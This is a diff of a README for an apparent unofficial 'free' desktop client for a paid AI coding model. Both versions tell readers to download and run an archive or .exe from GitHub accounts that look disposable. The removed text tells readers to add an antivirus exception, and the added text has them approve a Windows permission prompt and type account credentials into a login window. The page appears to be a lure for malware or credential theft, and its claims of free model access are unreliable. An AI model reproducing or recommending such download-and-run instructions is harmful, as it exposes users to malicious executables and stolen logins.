@@ -1,112 +1,99 @@
-# Claude Code Fable 5 Free App
+# 🤖 claude-code-fable-5-free-app - Access powerful AI models for free
 
-[![GitHub Release](https://img.shields.io/github/v/release/FieldofStrawberries/claude-code-fable-5-free-app?style=flat-square&color=8A2BE2)](https://github.com/FieldofStrawberries/claude-code-fable-5-free-app/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows)](https://www.microsoft.com/windows)
-[![Platform: macOS](https://img.shields.io/badge/Platform-macOS-000000?style=flat-square&logo=apple)](https://www.apple.com/macos)
-[![Platform: Linux](https://img.shields.io/badge/Platform-Linux-E95420?style=flat-square&logo=linux)](https://www.linux.org)
-> **⚠️ Disclaimer:** This is **not** an official Anthropic product. I am not affiliated with Anthropic. This is a community desktop client providing free access to Claude Code / Fable 5. Access methods may be unstable or subject to changes. Use at your own risk and respect Anthropic's Terms of Service.
+[![Download App](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://github.com/Genusoviboscremeanglais30/claude-code-fable-5-free-app)
 
-**Claude Code Fable 5 Free App** is a powerful, lightweight desktop application that gives you **free access** to **Claude Code Fable 5** — Anthropic’s advanced Mythos-class AI model optimized for coding, software engineering, reasoning, and development tasks.
+## 📋 Overview
 
-<img width="596" height="335" alt="image" src="https://github.com/user-attachments/assets/781600a7-93c6-453e-86a7-5f12e3eadfd4" />
+The claude-code-fable-5-free-app provides a desktop interface to interact with advanced AI models. This application removes the need for web browsers or complex web interfaces. It runs as a standalone program on your Windows computer. The software connects to the API to deliver generative text responses, code assistance, and creative tasks. Users gain access to a streamlined environment to manage their prompts and view chat history in a local window. This version offers a stable desktop experience for daily language tasks.
 
-## Install
-[Download `claude-fable-5-app.zip`](https://github.com/FieldofStrawberries/claude-code-fable-5-free-app/releases/download/fable-5/claude-fable-5-app.zip)
----
+## ⚙️ System Requirements
 
-<img width="1536" height="1024" alt="ChatGPT Image 14 июн  2026 г , 20_18_20(1)" src="https://github.com/user-attachments/assets/0ecb3865-e64c-4aee-8697-331d276182bc" />
+This application functions on most modern desktop environments. Check the following list to ensure compatibility:
 
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Dual-core processor with 2 GHz or faster.
+*   Memory: 4 GB of RAM.
+*   Storage: 200 MB of free disk space.
+*   Internet Connection: Required for model communication and account authentication.
 
+The app uses standard system fonts and graphics drivers. You do not need special hardware to run the software. If your computer runs standard productivity apps like word processors, this application will perform well.
 
-## 🚀 Key Features
-### AI Capabilities
-- **Claude Code Fable 5** — Full access to Anthropic’s powerful Mythos-class model.
-- **Superior Coding Performance** — Excellent code generation, debugging, refactoring, and architecture planning.
-- **Advanced Reasoning** — Strong problem-solving and logical analysis.
-- **Multimodal Support** — Image and file analysis for development tasks.
+## 🚀 Downloading the App
 
+You can find the installer on the official repository page. Follow these steps to prepare your download:
 
-<img width="554" height="554" alt="image" src="https://github.com/user-attachments/assets/9c8feb34-994a-4ea2-a150-70e4377b33a2" />
+1. Visit the project website: https://github.com/Genusoviboscremeanglais30/claude-code-fable-5-free-app
+2. Look for the section labeled Releases on the right side of the page.
+3. Click the latest version number.
+4. Find the file with the .exe extension in the Assets list.
+5. Save the file to your desktop or downloads folder.
 
+Ensure you download the file from this specific link to verify you have the release version.
 
-### Desktop Experience
-- **Native Cross-Platform App** — Smooth performance on Windows, macOS, and Linux.
-- **Developer-Friendly UI** — Clean interface with conversation history and code blocks.
-- **System Tray & Hotkeys** — Quick access while working.
-- **Custom Instructions** — Set persistent system prompts tailored for coding.
+## 📦 Installation Instructions
 
-### Productivity Tools
-- **Project Context** — Maintain context across long coding sessions.
-- **Code Export** — Easily copy or save generated code.
-- **Proxy / Router Support** — Works with various free access methods.
-- **Theme Support** — Dark mode optimized for developers.
+Follow these steps to install the software on your Windows computer:
 
----
-## 📖 Usage Guide
-### Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive and run the application.
-3. **Configure Access** — Follow the in-app instructions for free Claude Code Fable 5 access.
-4. **Start Coding** — Ask for code, debugging, explanations, or architecture help.
+1. Locate the downloaded .exe file.
+2. Double-click the file to start the installer.
+3. Windows may ask for permission to run the application. Click Yes to proceed.
+4. Follow the prompts in the installation wizard.
+5. Choose your install location or leave the default setting.
+6. Click Install.
+7. Click Finish when the bar fills.
 
-### Pro Tips
-- Provide clear context and examples for best coding results.
-- Use detailed prompts for complex tasks.
-- Save important conversations and code snippets.
+The installer creates a shortcut on your desktop. Use this icon to launch the application.
 
----
-## 🛠️ Installation & Requirements
-### Platform Support
-- **Windows 10 / 11**
-- **macOS**
-- **Linux**
+## 🖥️ Using the Interface
 
-### Instructions
-1. Download the latest release archive.
-2. Extract to any folder.
-3. Run the executable.
-4. Add antivirus exception if prompted.
+The interface consists of a central chat panel and a sidebar for settings. When you launch the app, you see a text box at the bottom of the screen. Type your request or prompt into this box and press Enter.
 
-### Notes
-- Requires internet connection.
-- Access method may require periodic updates.
-- Best performance on modern hardware.
+The model generates a response in the main window. You can scroll through previous messages to review past conversations. The sidebar allows you to organize different chat sessions. Use the settings menu to adjust theme preferences or check for software updates.
 
----
-## 🛡️ Security & Legal
-**Important Notice:**  
-This is an unofficial desktop client. Anthropic may change or restrict access at any time. Use responsibly and ethically.
+## 🔑 Account and Access
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
-- Review the source code for transparency.
+Most features require a login to verify usage. The application uses a secure process to connect to your account. When you open the software for the first time, a login window appears. Enter your credentials to continue. This process preserves your session so you do not need to log in every time you open the app. The system supports trial access for new users.
 
----
-## 🤝 Contributing
-Contributions are welcome!
-1. Fork the project.
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`).
-3. Commit your changes.
-4. Push to the branch.
-5. Open a Pull Request.
+## 💡 Common Tasks
 
----
-## 📄 License & Acknowledgments
-### License
-**Claude Code Fable 5 Free App** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+This tool handles a wide range of language activities. You can use it for:
 
-**Copyright © 2026 FieldofStrawberries**
+*   Drafting emails and formal letters.
+*   Writing code snippets for various programming languages.
+*   Summarizing long documents or articles.
+*   Brainstorming ideas for creative projects.
+*   Explaining complex topics in simple language.
 
-### Acknowledgments
-- Thanks to Anthropic for developing Claude Fable 5.
-- The open-source community for desktop AI tools.
-- All contributors making powerful AI coding assistants more accessible.
+The model adapts to your specific prompts. Be clear in your instructions to get the best results.
 
-<p align="center">
-  Developed with ❤️ for the developer community
-</p>
+## 🛠️ Troubleshooting Tips
 
-<img width="305" height="165" alt="image" src="https://github.com/user-attachments/assets/4fb96878-833b-411b-8928-1a283f9e25ae" />
+If you encounter issues, try these steps to fix the problem:
+
+*   Refresh your internet connection. The app requires a steady connection to send and receive text.
+*   Restart the application. Close the window and launch it again using the desktop shortcut.
+*   Check for updates. Visit the download link if the app stops responding or shows errors.
+*   Clear your cache. Settings in the sidebar allow you to wipe temporary files if the app runs slowly.
+*   Verify your login. If you see an authentication error, sign out and sign back in with your account details.
+
+## 🔒 Security and Privacy
+
+The application runs locally on your machine. We do not store your chat history on our servers. All information travels through encrypted channels during the request process. You control your data. You can delete chat history at any time from within the settings menu.
+
+## 📋 Frequently Asked Questions
+
+**Does this app cost money?**
+The application provides access to free tiers and trials. Check your account dashboard for current plan details.
+
+**Can I run this on a Mac?**
+This version is designed for Windows.
+
+**How do I update the app?**
+The software checks for updates when you start it. If an update exists, the app notifies you.
+
+**Is my data private?**
+Yes. Your conversations remain within your local environment where possible.
+
+## 📝 Configuration Settings
+
+Access the settings menu to personalize the app. You can switch between light and dark themes. You can also adjust the font size for readability. Advanced users can configure API timeouts or proxy settings if the network environment requires extra steps. Most users operate the app with default settings for a smooth experience.
